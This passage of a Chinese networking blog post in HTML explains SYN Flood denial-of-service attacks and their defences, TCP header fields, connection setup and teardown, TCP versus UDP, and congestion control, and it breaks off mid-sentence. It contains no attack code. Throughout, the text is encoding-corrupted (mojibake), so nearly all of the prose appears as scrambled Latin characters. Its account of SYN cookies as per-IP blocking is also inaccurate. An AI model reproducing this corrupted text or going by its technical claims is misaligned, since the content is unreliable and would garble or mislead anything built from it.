Floodæ˜¯å½“å‰æœ€æµè¡Œçš„DoSï¼ˆæ‹’ç»æœåŠ¡æ”»å‡»ï¼‰ä¸DDoSï¼ˆåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼‰çš„æ–¹å¼ä¹‹ä¸€ï¼Œè¿™æ˜¯ä¸€ç§åˆ©ç”¨TCPåè®®ç¼ºé™·ï¼Œå‘é€å¤§é‡ä¼ªé€ çš„TCPè¿æ¥è¯·æ±‚ï¼Œä»è€Œä½¿å¾—è¢«æ”»å‡»æ–¹èµ„æºè€—å°½ï¼ˆCPUæ»¡è´Ÿè·æˆ–å†…å­˜ä¸è¶³ï¼‰çš„æ”»å‡»æ–¹å¼ã€‚</p><h5><span id="åŸç†">åŸç†</span></h5><p>å¤§å®¶éƒ½çŸ¥é“ï¼ŒTCPä¸UDPä¸åŒï¼Œå®ƒæ˜¯åŸºäºè¿æ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šä¸ºäº†åœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ é€TCPæ•°æ®ï¼Œå¿…é¡»å…ˆå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿé“¾è·¯ï¼Œä¹Ÿå°±æ˜¯TCPè¿æ¥ï¼Œå»ºç«‹TCPè¿æ¥çš„æ ‡å‡†è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><p>é¦–å…ˆï¼Œè¯·æ±‚ç«¯ï¼ˆå®¢æˆ·ç«¯ï¼‰å‘é€ä¸€ä¸ªåŒ…å«SYNæ ‡å¿—çš„TCPæŠ¥æ–‡ï¼ŒSYNå³åŒæ­¥ï¼ˆSynchronizeï¼‰ï¼ŒåŒæ­¥æŠ¥æ–‡ä¼šæŒ‡æ˜å®¢æˆ·ç«¯ä½¿ç”¨çš„ç«¯å£ä»¥åŠTCPè¿æ¥çš„åˆå§‹åºå·ï¼›</p><p>ç¬¬äºŒæ­¥ï¼ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°å®¢æˆ·ç«¯çš„SYNæŠ¥æ–‡åï¼Œå°†è¿”å›ä¸€ä¸ªSYN+ACKçš„æŠ¥æ–‡ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯çš„è¯·æ±‚è¢«æ¥å—ï¼ŒåŒæ—¶TCPåºå·è¢«åŠ ä¸€ï¼ŒACKå³ç¡®è®¤ï¼ˆAcknowledgementï¼‰ã€‚</p><p>ç¬¬ä¸‰æ­¥ï¼Œå®¢æˆ·ç«¯ä¹Ÿè¿”å›ä¸€ä¸ªç¡®è®¤æŠ¥æ–‡ACKç»™æœåŠ¡å™¨ç«¯ï¼ŒåŒæ ·TCPåºåˆ—å·è¢«åŠ ä¸€ï¼Œåˆ°æ­¤ä¸€ä¸ªTCPè¿æ¥å®Œæˆã€‚</p><p>ä»¥ä¸Šçš„è¿æ¥è¿‡ç¨‹åœ¨TCPåè®®ä¸­è¢«ç§°ä¸ºä¸‰æ¬¡æ¡æ‰‹ï¼ˆThree-way Handshakeï¼‰ã€‚</p><p>å‡è®¾ä¸€ä¸ªç”¨æˆ·å‘æœåŠ¡å™¨å‘é€äº†SYNæŠ¥æ–‡åçªç„¶æ­»æœºæˆ–æ‰çº¿ï¼Œé‚£ä¹ˆæœåŠ¡å™¨åœ¨å‘å‡ºSYN+ACKåº”ç­”æŠ¥æ–‡åæ˜¯æ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯çš„ACKæŠ¥æ–‡çš„ï¼ˆç¬¬ä¸‰æ¬¡æ¡æ‰‹æ— æ³•å®Œæˆï¼‰ï¼Œè¿™ç§æƒ…å†µä¸‹æœåŠ¡å™¨ç«¯ä¸€èˆ¬ä¼šé‡è¯•ï¼ˆå†æ¬¡å‘é€SYN+ACKç»™å®¢æˆ·ç«¯ï¼‰å¹¶ç­‰å¾…ä¸€æ®µæ—¶é—´åä¸¢å¼ƒè¿™ä¸ªæœªå®Œæˆçš„è¿æ¥ï¼Œè¿™æ®µæ—¶é—´çš„é•¿åº¦æˆ‘ä»¬ç§°ä¸ºSYN Timeoutï¼Œä¸€èˆ¬æ¥è¯´è¿™ä¸ªæ—¶é—´æ˜¯åˆ†é’Ÿçš„æ•°é‡çº§ï¼ˆå¤§çº¦ä¸º30ç§’-2åˆ†é’Ÿï¼‰ï¼›ä¸€ä¸ªç”¨æˆ·å‡ºç°å¼‚å¸¸å¯¼è‡´æœåŠ¡å™¨çš„ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…1åˆ†é’Ÿå¹¶ä¸æ˜¯ä»€ä¹ˆå¾ˆå¤§çš„é—®é¢˜ï¼Œä½†å¦‚æœæœ‰ä¸€ä¸ªæ¶æ„çš„æ”»å‡»è€…å¤§é‡æ¨¡æ‹Ÿè¿™ç§æƒ…å†µï¼ŒæœåŠ¡å™¨ç«¯å°†ä¸ºäº†ç»´æŠ¤ä¸€ä¸ªéå¸¸å¤§çš„åŠè¿æ¥åˆ—è¡¨è€Œæ¶ˆè€—éå¸¸å¤šçš„èµ„æºâ€”-æ•°ä»¥ä¸‡è®¡çš„åŠè¿æ¥ï¼Œå³ ä½¿æ˜¯ç®€å•çš„ä¿å­˜å¹¶éå†ä¹Ÿä¼šæ¶ˆè€—éå¸¸å¤šçš„CPUæ—¶é—´å’Œå†…å­˜ï¼Œä½•å†µè¿˜è¦ä¸æ–­å¯¹è¿™ä¸ªåˆ—è¡¨ä¸­çš„IPè¿›è¡ŒSYN+ACKçš„é‡è¯•ã€‚å®é™…ä¸Šå¦‚æœæœåŠ¡å™¨çš„TCP&#x2F;IPæ ˆä¸å¤Ÿå¼ºå¤§ï¼Œæœ€åçš„ç»“æœå¾€å¾€æ˜¯å †æ ˆæº¢å‡ºå´©æºƒâ€”å³ä½¿æœåŠ¡å™¨ç«¯çš„ç³»ç»Ÿè¶³å¤Ÿå¼ºå¤§ï¼ŒæœåŠ¡å™¨ç«¯ä¹Ÿå°†å¿™äºå¤„ç†æ”»å‡»è€…ä¼ªé€ çš„TCPè¿æ¥è¯·æ±‚è€Œæ— æš‡ç†ç¬å®¢æˆ·çš„æ­£å¸¸è¯·æ±‚ï¼ˆæ¯•ç«Ÿå®¢æˆ·ç«¯çš„æ­£å¸¸è¯·æ±‚æ¯”ç‡éå¸¸ä¹‹å°ï¼‰ï¼Œæ­¤æ—¶ä»æ­£å¸¸å®¢æˆ·çš„è§’åº¦çœ‹æ¥ï¼ŒæœåŠ¡å™¨å¤±å»å“åº”ï¼Œè¿™ç§æƒ…å†µæˆ‘ä»¬ç§°ä½œï¼šæœåŠ¡å™¨ç«¯å—åˆ°äº†SYN Floodæ”»å‡»ï¼ˆSYNæ´ªæ°´æ”»å‡»ï¼‰ã€‚</p><h5><span id="é˜²èŒƒæœºåˆ¶"><em>é˜²èŒƒæœºåˆ¶</em></span></h5><p>Ã˜ ç¬¬ä¸€ç§æ˜¯ç¼©çŸ­SYN Timeoutæ—¶é—´ï¼Œç”±äºSYN Floodæ”»å‡»çš„æ•ˆæœå–å†³äºæœåŠ¡å™¨ä¸Šä¿æŒçš„SYNåŠè¿æ¥æ•°ï¼Œè¿™ä¸ªå€¼&#x3D;SYNæ”»å‡»çš„é¢‘åº¦ x SYN Timeoutï¼Œæ‰€ä»¥é€šè¿‡ç¼©çŸ­ä»æ¥æ”¶åˆ°SYNæŠ¥æ–‡åˆ°ç¡®å®šè¿™ä¸ªæŠ¥æ–‡æ— æ•ˆå¹¶ä¸¢å¼ƒæ”¹è¿æ¥çš„æ—¶é—´ï¼Œä¾‹å¦‚è®¾ç½®ä¸º20ç§’ä»¥ä¸‹ï¼ˆè¿‡ä½çš„SYN Timeoutè®¾ç½®å¯èƒ½ä¼šå½±å“å®¢æˆ·çš„æ­£å¸¸è®¿é—®ï¼‰ï¼Œå¯ä»¥æˆå€çš„é™ä½æœåŠ¡å™¨çš„è´Ÿè·ã€‚</p><p>Ã˜ ç¬¬äºŒç§æ–¹æ³•æ˜¯è®¾ç½®SYN Cookieï¼Œå°±æ˜¯ç»™æ¯ä¸€ä¸ªè¯·æ±‚è¿æ¥çš„IPåœ°å€åˆ†é…ä¸€ä¸ªCookieï¼Œå¦‚æœçŸ­æ—¶é—´å†…è¿ç»­å—åˆ°æŸä¸ªIPçš„é‡å¤SYNæŠ¥æ–‡ï¼Œå°±è®¤å®šæ˜¯å—åˆ°äº†æ”»å‡»ï¼Œä»¥åä»è¿™ä¸ªIPåœ°å€æ¥çš„åŒ…ä¼šè¢«ä¸€æ¦‚ä¸¢å¼ƒã€‚</p><p>Ã˜ å¯æ˜¯ä¸Šè¿°çš„ä¸¤ç§æ–¹æ³•åªèƒ½å¯¹ä»˜æ¯”è¾ƒåŸå§‹çš„SYN Floodæ”»å‡»ï¼Œç¼©çŸ­SYN Timeoutæ—¶é—´ä»…åœ¨å¯¹æ–¹æ”»å‡»é¢‘åº¦ä¸é«˜çš„æƒ…å†µä¸‹ç”Ÿæ•ˆï¼ŒSYN Cookieæ›´ä¾èµ–äºå¯¹æ–¹ä½¿ç”¨çœŸå®çš„IPåœ°å€ï¼Œå¦‚æœæ”»å‡»è€…ä»¥æ•°ä¸‡&#x2F;ç§’çš„é€Ÿåº¦å‘é€SYNæŠ¥æ–‡ï¼ŒåŒæ—¶åˆ©ç”¨SOCK_RAWéšæœºæ”¹å†™IPæŠ¥æ–‡ä¸­çš„æºåœ°å€ï¼Œä»¥ä¸Šçš„æ–¹æ³•å°†æ¯«æ— ç”¨æ­¦ä¹‹åœ°ã€‚</p><h3><span id="tcpæŠ¥æ–‡å¤´"><em>TCPæŠ¥æ–‡å¤´</em> âˆš</span></h3><h5><span id="å®šä¹‰"><em>å®šä¹‰</em></span></h5><p><img src="/2020/03/30/Network/image-20200330094555619.png"></p><p>åºåˆ—å·seqï¼šå 4ä¸ªå­—èŠ‚ï¼Œç”¨æ¥æ ‡è®°æ•°æ®æ®µçš„é¡ºåºï¼ŒTCPæŠŠè¿æ¥ä¸­å‘é€çš„æ‰€æœ‰æ•°æ®å­—èŠ‚éƒ½ç¼–ä¸Šä¸€ä¸ªåºå·ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·ç”±æœ¬åœ°éšæœºäº§ç”Ÿï¼›ç»™å­—èŠ‚ç¼–ä¸Šåºå·åï¼Œå°±ç»™æ¯ä¸€ä¸ªæŠ¥æ–‡æ®µæŒ‡æ´¾ä¸€ä¸ªåºå·ï¼›åºåˆ—å·seqå°±æ˜¯è¿™ä¸ªæŠ¥æ–‡æ®µä¸­çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ç¼–å·ã€‚ </p><p>  ç¡®è®¤å·ackï¼šå 4ä¸ªå­—èŠ‚ï¼ŒæœŸå¾…æ”¶åˆ°å¯¹æ–¹ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„ç¬¬ä¸€ä¸ªæ•°æ®å­—èŠ‚çš„åºå·ï¼›åºåˆ—å·è¡¨ç¤ºæŠ¥æ–‡æ®µæºå¸¦æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·ï¼›è€Œç¡®è®¤å·æŒ‡çš„æ˜¯æœŸæœ›æ¥æ”¶åˆ°ä¸‹ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·ï¼›å› æ­¤å½“å‰æŠ¥æ–‡æ®µæœ€åä¸€ä¸ªå­—èŠ‚çš„ç¼–å·+1å³ä¸ºç¡®è®¤å·ã€‚ </p><p>  ç¡®è®¤ACKï¼šå 1ä½ï¼Œä»…å½“ACK&#x3D;1æ—¶ï¼Œç¡®è®¤å·å­—æ®µæ‰æœ‰æ•ˆã€‚ACK&#x3D;0æ—¶ï¼Œç¡®è®¤å·æ— æ•ˆ </p><p>  åŒæ­¥SYNï¼šè¿æ¥å»ºç«‹æ—¶ç”¨äºåŒæ­¥åºå·ã€‚å½“SYN&#x3D;1ï¼ŒACK&#x3D;0æ—¶è¡¨ç¤ºï¼šè¿™æ˜¯ä¸€ä¸ªè¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µã€‚è‹¥åŒæ„è¿æ¥ï¼Œåˆ™åœ¨å“åº”æŠ¥æ–‡æ®µä¸­ä½¿å¾—SYN&#x3D;1ï¼ŒACK&#x3D;1ã€‚å› æ­¤ï¼ŒSYN&#x3D;1è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªè¿æ¥è¯·æ±‚ï¼Œæˆ–è¿æ¥æ¥å—æŠ¥æ–‡ã€‚SYNè¿™ä¸ªæ ‡å¿—ä½åªæœ‰åœ¨TCPå»ºäº§è¿æ¥æ—¶æ‰ä¼šè¢«ç½®1ï¼Œæ¡æ‰‹å®ŒæˆåSYNæ ‡å¿—ä½è¢«ç½®0ã€‚ </p><p>  ç»ˆæ­¢FINï¼šç”¨æ¥é‡Šæ”¾ä¸€ä¸ªè¿æ¥ã€‚FIN&#x3D;1è¡¨ç¤ºï¼šæ­¤æŠ¥æ–‡æ®µçš„å‘é€æ–¹çš„æ•°æ®å·²ç»å‘é€å®Œæ¯•ï¼Œå¹¶è¦æ±‚é‡Šæ”¾è¿è¾“è¿æ¥ </p><p>  PSï¼šACKã€SYNå’ŒFINè¿™äº›å¤§å†™çš„å•è¯è¡¨ç¤ºæ ‡å¿—ä½ï¼Œå…¶å€¼è¦ä¹ˆæ˜¯1ï¼Œè¦ä¹ˆæ˜¯0ï¼›ackã€seqå°å†™çš„å•è¯è¡¨ç¤ºåºå·ã€‚</p><p> <img src="/2020/03/30/Network/image-20200330094814772.png"></p><h4><span id="ä¸‰æ¬¡æ¡æ‰‹">ä¸‰æ¬¡æ¡æ‰‹</span></h4><p><img src="/2020/03/30/Network/image-20200330094908871.png"></p><p>ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå»ºç«‹è¿æ¥æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€synåŒ…ï¼ˆsyn&#x3D;xï¼‰åˆ°æœåŠ¡å™¨ï¼Œå¹¶è¿›å…¥SYN_SENTçŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨ç¡®è®¤ï¼›SYNï¼šåŒæ­¥åºåˆ—ç¼–å·ï¼ˆSynchronize Sequence Numbersï¼‰ã€‚</p><p>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°synåŒ…ï¼Œå¿…é¡»ç¡®è®¤å®¢æˆ·çš„SYNï¼ˆack&#x3D;x+1ï¼‰ï¼ŒåŒæ—¶è‡ªå·±ä¹Ÿå‘é€ä¸€ä¸ªSYNåŒ…ï¼ˆsyn&#x3D;yï¼‰ï¼Œå³SYN+ACKåŒ…ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥SYN_RECVçŠ¶æ€ï¼›</p><p>ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„SYN+ACKåŒ…ï¼Œå‘æœåŠ¡å™¨å‘é€ç¡®è®¤åŒ…ACK(ack&#x3D;y+1ï¼‰ï¼Œæ­¤åŒ…å‘é€å®Œæ¯•ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¿›å…¥ESTABLISHEDï¼ˆTCPè¿æ¥æˆåŠŸï¼‰çŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€‚</p><h4><span id="å››æ¬¡æŒ¥æ‰‹">å››æ¬¡æŒ¥æ‰‹</span></h4><p><img src="/2020/03/30/Network/image-20200330095258015.png"></p><p>1ï¼‰å®¢æˆ·ç«¯è¿›ç¨‹å‘å‡ºè¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼Œå¹¶ä¸”åœæ­¢å‘é€æ•°æ®ã€‚é‡Šæ”¾æ•°æ®æŠ¥æ–‡é¦–éƒ¨ï¼ŒFIN&#x3D;1ï¼Œå…¶åºåˆ—å·ä¸ºseq&#x3D;uï¼ˆç­‰äºå‰é¢å·²ç»ä¼ é€è¿‡æ¥çš„æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„åºå·åŠ 1ï¼‰ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯è¿›å…¥FIN-WAIT-1ï¼ˆç»ˆæ­¢ç­‰å¾…1ï¼‰çŠ¶æ€ã€‚ TCPè§„å®šï¼Œ<font color="red">FINæŠ¥æ–‡æ®µå³ä½¿ä¸æºå¸¦æ•°æ®ï¼Œä¹Ÿè¦æ¶ˆè€—ä¸€ä¸ªåºå·ã€‚</font></p><p>2ï¼‰æœåŠ¡å™¨æ”¶åˆ°è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼Œå‘å‡ºç¡®è®¤æŠ¥æ–‡ï¼ŒACK&#x3D;1ï¼Œack&#x3D;u+1ï¼Œå¹¶ä¸”å¸¦ä¸Šè‡ªå·±çš„åºåˆ—å·seq&#x3D;vï¼Œæ­¤æ—¶ï¼ŒæœåŠ¡ç«¯å°±è¿›å…¥äº†CLOSE-WAITï¼ˆå…³é—­ç­‰å¾…ï¼‰çŠ¶æ€ã€‚TCPæœåŠ¡å™¨é€šçŸ¥é«˜å±‚çš„åº”ç”¨è¿›ç¨‹ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„æ–¹å‘å°±é‡Šæ”¾äº†ï¼Œè¿™æ—¶å€™å¤„äºåŠå…³é—­çŠ¶æ€ï¼Œå³å®¢æˆ·ç«¯å·²ç»æ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼Œä½†æ˜¯æœåŠ¡å™¨è‹¥å‘é€æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¾ç„¶è¦æ¥å—ã€‚è¿™ä¸ªçŠ¶æ€è¿˜è¦æŒç»­ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªCLOSE-WAITçŠ¶æ€æŒç»­çš„æ—¶é—´ã€‚</p><p>3ï¼‰å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„ç¡®è®¤è¯·æ±‚åï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥FIN-WAIT-2ï¼ˆç»ˆæ­¢ç­‰å¾…2ï¼‰çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨å‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼ˆåœ¨è¿™ä¹‹å‰è¿˜éœ€è¦æ¥å—æœåŠ¡å™¨å‘é€çš„æœ€åçš„æ•°æ®ï¼‰ã€‚</p><p>4ï¼‰æœåŠ¡å™¨å°†æœ€åçš„æ•°æ®å‘é€å®Œæ¯•åï¼Œå°±å‘å®¢æˆ·ç«¯å‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼ŒFIN&#x3D;1ï¼Œack&#x3D;u+1ï¼Œç”±äºåœ¨åŠå…³é—­çŠ¶æ€ï¼ŒæœåŠ¡å™¨å¾ˆå¯èƒ½åˆå‘é€äº†ä¸€äº›æ•°æ®ï¼Œå‡å®šæ­¤æ—¶çš„åºåˆ—å·ä¸ºseq&#x3D;wï¼Œæ­¤æ—¶ï¼ŒæœåŠ¡å™¨å°±è¿›å…¥äº†LAST-ACKï¼ˆæœ€åç¡®è®¤ï¼‰çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„ç¡®è®¤ã€‚</p><p>5ï¼‰å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡åï¼Œå¿…é¡»å‘å‡ºç¡®è®¤ï¼ŒACK&#x3D;1ï¼Œack&#x3D;w+1ï¼Œè€Œè‡ªå·±çš„åºåˆ—å·æ˜¯seq&#x3D;u+1ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥äº†TIME-WAITï¼ˆæ—¶é—´ç­‰å¾…ï¼‰çŠ¶æ€ã€‚æ³¨æ„æ­¤æ—¶TCPè¿æ¥è¿˜æ²¡æœ‰é‡Šæ”¾ï¼Œå¿…é¡»ç»è¿‡2âˆ—âˆ—MSLï¼ˆæœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½MaximumSegmentLifetimeï¼‰çš„æ—¶é—´åï¼Œå½“å®¢æˆ·ç«¯æ’¤é”€ç›¸åº”çš„TCBåï¼Œæ‰è¿›å…¥CLOSEDçŠ¶æ€ã€‚</p><p>6ï¼‰æœåŠ¡å™¨åªè¦æ”¶åˆ°äº†å®¢æˆ·ç«¯å‘å‡ºçš„ç¡®è®¤ï¼Œç«‹å³è¿›å…¥CLOSEDçŠ¶æ€ã€‚åŒæ ·ï¼Œæ’¤é”€TCBï¼ˆä¼ è¾“æ§åˆ¶å—ï¼‰åï¼Œå°±ç»“æŸäº†è¿™æ¬¡çš„TCPè¿æ¥ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç»“æŸTCPè¿æ¥çš„æ—¶é—´è¦æ¯”å®¢æˆ·ç«¯æ—©ä¸€äº›ã€‚</p><h3><span id="å’Œudpçš„åŒºåˆ«"><em>å’ŒUDPçš„åŒºåˆ«</em></span></h3><p>TCP æ˜¯é¢å‘è¿æ¥çš„ï¼ŒUDP æ˜¯é¢å‘æ— è¿æ¥çš„</p><p>UDPç¨‹åºç»“æ„è¾ƒç®€å•</p><p>TCP æ˜¯é¢å‘å­—èŠ‚æµçš„ï¼ŒUDP æ˜¯åŸºäºæ•°æ®æŠ¥çš„</p><p>TCP ä¿è¯æ•°æ®æ­£ç¡®æ€§ï¼ŒUDP å¯èƒ½ä¸¢åŒ…</p><p>TCP ä¿è¯æ•°æ®é¡ºåºï¼ŒUDP ä¸ä¿è¯</p><p><strong>TCPçš„ä¼˜ç‚¹</strong>ï¼š<font color="orange"> å¯é ï¼Œç¨³å®š</font> TCPçš„å¯é ä½“ç°åœ¨TCPåœ¨ä¼ é€’æ•°æ®ä¹‹å‰ï¼Œä¼šæœ‰ä¸‰æ¬¡æ¡æ‰‹æ¥å»ºç«‹è¿æ¥ï¼Œè€Œä¸”åœ¨æ•°æ®ä¼ é€’æ—¶ï¼Œæœ‰<font color="orange"> ç¡®è®¤ã€çª—å£ã€é‡ä¼ ã€æ‹¥å¡æ§åˆ¶æœºåˆ¶</font>ï¼Œåœ¨æ•°æ®ä¼ å®Œåï¼Œè¿˜ä¼šæ–­å¼€è¿æ¥ç”¨æ¥èŠ‚çº¦ç³»ç»Ÿèµ„æºã€‚ TCPçš„ç¼ºç‚¹ï¼š<font color="blue">  æ…¢ï¼Œæ•ˆç‡ä½ï¼Œå ç”¨ç³»ç»Ÿèµ„æºé«˜ï¼Œæ˜“è¢«æ”»å‡»</font> ã€‚</p><p><strong>UDPçš„ä¼˜ç‚¹</strong>ï¼š <font color="orange"> å¿«ï¼Œæ¯”TCPç¨å®‰å…¨</font> UDPæ²¡æœ‰TCPçš„æ¡æ‰‹ã€ç¡®è®¤ã€çª—å£ã€é‡ä¼ ã€æ‹¥å¡æ§åˆ¶ç­‰æœºåˆ¶ï¼ŒUDPæ˜¯ä¸€ä¸ªæ— çŠ¶æ€çš„ä¼ è¾“åè®®ï¼Œæ‰€ä»¥å®ƒåœ¨ä¼ é€’æ•°æ®æ—¶éå¸¸å¿«ã€‚æ²¡æœ‰TCPçš„è¿™äº›æœºåˆ¶ï¼ŒUDPè¾ƒTCPè¢«æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´å°±è¦å°‘ä¸€äº›ã€‚ä½†UDPä¹Ÿæ˜¯æ— æ³•é¿å…æ”»å‡»çš„ï¼Œæ¯”å¦‚ï¼šUDP Floodæ”»å‡»â€¦â€¦ UDPçš„ç¼ºç‚¹ï¼š<font color="blue"> ä¸å¯é ï¼Œä¸ç¨³å®š</font> å› ä¸ºUDPæ²¡æœ‰TCPé‚£äº›å¯é çš„æœºåˆ¶ï¼Œåœ¨æ•°æ®ä¼ é€’æ—¶ï¼Œå¦‚æœç½‘ç»œè´¨é‡ä¸å¥½ï¼Œå°±ä¼šå¾ˆå®¹æ˜“ä¸¢åŒ…ã€‚ åŸºäºä¸Šé¢çš„ä¼˜ç¼ºç‚¹ï¼Œ</p><p>é‚£ä¹ˆï¼š ä»€ä¹ˆæ—¶å€™åº”è¯¥ä½¿ç”¨TCPï¼š å½“å¯¹ç½‘ç»œé€šè®¯è´¨é‡æœ‰è¦æ±‚çš„æ—¶å€™ï¼Œæ¯”å¦‚ï¼šæ•´ä¸ªæ•°æ®è¦å‡†ç¡®æ— è¯¯çš„ä¼ é€’ç»™å¯¹æ–¹ï¼Œè¿™å¾€å¾€ç”¨äºä¸€äº›è¦æ±‚å¯é çš„åº”ç”¨ï¼Œæ¯”å¦‚HTTPã€HTTPSã€FTPç­‰ä¼ è¾“æ–‡ä»¶çš„åè®®ï¼ŒPOPã€SMTPç­‰é‚®ä»¶ä¼ è¾“çš„åè®®ã€‚ åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œå¸¸è§ä½¿ç”¨TCPåè®®çš„åº”ç”¨å¦‚ä¸‹ï¼š æµè§ˆå™¨ï¼Œç”¨çš„HTTP FlashFXPï¼Œç”¨çš„FTP Outlookï¼Œç”¨çš„POPã€SMTP Puttyï¼Œç”¨çš„Telnetã€SSH QQæ–‡ä»¶ä¼ è¾“ â€¦â€¦â€¦â€¦ ä»€ä¹ˆæ—¶å€™åº”è¯¥ä½¿ç”¨UDPï¼š å½“å¯¹ç½‘ç»œé€šè®¯è´¨é‡è¦æ±‚ä¸é«˜çš„æ—¶å€™ï¼Œè¦æ±‚ç½‘ç»œé€šè®¯é€Ÿåº¦èƒ½å°½é‡çš„å¿«ï¼Œè¿™æ—¶å°±å¯ä»¥ä½¿ç”¨UDPã€‚ æ¯”å¦‚ï¼Œæ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œå¸¸è§ä½¿ç”¨UDPåè®®çš„åº”ç”¨å¦‚ä¸‹ï¼š QQè¯­éŸ³ QQè§†é¢‘ TFTP â€¦â€¦DNS,DHCP</p><h5><span id="udpçš„æŠ¥å¤´-"><em>UDPçš„æŠ¥å¤´</em> -</span></h5><p><img src="/2020/03/30/Network/clip_image002.jpg" alt="UDP åŒ…å¤´"></p><h5><span id="åŸºäº-udp-çš„å‡ ä¸ªä¾‹å­"><em>åŸºäº UDP çš„å‡ ä¸ªä¾‹å­</em></span></h5><p>ç›´æ’­ã€‚ç›´æ’­å¯¹å®æ—¶æ€§çš„è¦æ±‚æ¯”è¾ƒé«˜ï¼Œå®å¯ä¸¢åŒ…ï¼Œä¹Ÿä¸è¦å¡é¡¿çš„ï¼Œæ‰€ä»¥å¾ˆå¤šç›´æ’­åº”ç”¨éƒ½åŸºäº UDP å®ç°äº†è‡ªå·±çš„è§†é¢‘ä¼ è¾“åè®®</p><p>å®æ—¶æ¸¸æˆã€‚æ¸¸æˆçš„ç‰¹ç‚¹ä¹Ÿæ˜¯å®æ—¶æ€§æ¯”è¾ƒé«˜ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé‡‡ç”¨è‡ªå®šä¹‰çš„å¯é çš„ UDP åè®®ï¼Œè‡ªå®šä¹‰é‡ä¼ ç­–ç•¥ï¼Œèƒ½å¤ŸæŠŠäº§ç”Ÿçš„å»¶è¿Ÿé™åˆ°æœ€ä½ï¼Œå‡å°‘ç½‘ç»œé—®é¢˜å¯¹æ¸¸æˆé€ æˆçš„å½±å“</p><p>ç‰©è”ç½‘ã€‚ä¸€æ–¹é¢ï¼Œç‰©è”ç½‘é¢†åŸŸä¸­æ–­èµ„æºå°‘ï¼Œå¾ˆå¯èƒ½çŸ¥è¯†ä¸ªå¾ˆå°çš„åµŒå…¥å¼ç³»ç»Ÿï¼Œè€Œç»´æŠ¤ TCP åè®®çš„ä»£ä»·å¤ªå¤§äº†ï¼›å¦ä¸€æ–¹é¢ï¼Œç‰©è”ç½‘å¯¹å®æ—¶æ€§çš„è¦æ±‚ä¹Ÿç‰¹åˆ«é«˜ã€‚æ¯”å¦‚ Google æ——ä¸‹çš„ Nest ç®€å† Thread Groupï¼Œæ¨å‡ºäº†ç‰©è”ç½‘é€šä¿¡åè®® Threadï¼Œå°±æ˜¯åŸºäº UDP åè®®çš„</p><h3><span id="å¯é æ€§">å¯é æ€§ï¼š</span></h3><ul><li>åº”ç­”æœºåˆ¶ï¼Œä¸‰æ¬¡æ¡æ‰‹ã€å››æ¬¡æŒ¥æ‰‹ã€æ»‘åŠ¨çª—å£ã€è¶…æ—¶é‡ä¼ </li></ul><h3><span id="æ‹¥å¡æ§åˆ¶"><em>æ‹¥å¡æ§åˆ¶</em></span></h3><ul><li><p>æ…¢å¼€å§‹</p><blockquote><p>ä»å°åˆ°å¤§é€æ¸å¢å¤§å‘é€çª—å£ï¼Œæ¯æ”¶åˆ°ä¸€ä¸ªæ–°æŠ¥æ–‡æ®µçš„ç¡®è®¤åï¼Œå¯ä»¥å¢å¤§ä¸€ä¸ªSMSSï¼ˆå‘é€æ–¹æœ€å¤§æŠ¥æ–‡æ®µï¼‰çš„å€¼ï¼ŒTCPè®¾ç½®ä¸€ä¸ªæ…¢å¼€å§‹é—¨é™çŠ¶æ€ï¼Œæ‹¥å¡çª—å£å¤§å°è¶…è¿‡æ­¤å€¼æ—¶è¿›å…¥æ‹¥å¡æ§åˆ¶ã€‚</p></blockquote></li><li><p>æ‹¥å¡é¿å…ç®—æ³•</p><blockquote><p>æŒ‰æ‹¥å¡çª—å£æŒ‰çº¿æ€§å¢é•¿ï¼Œæ¯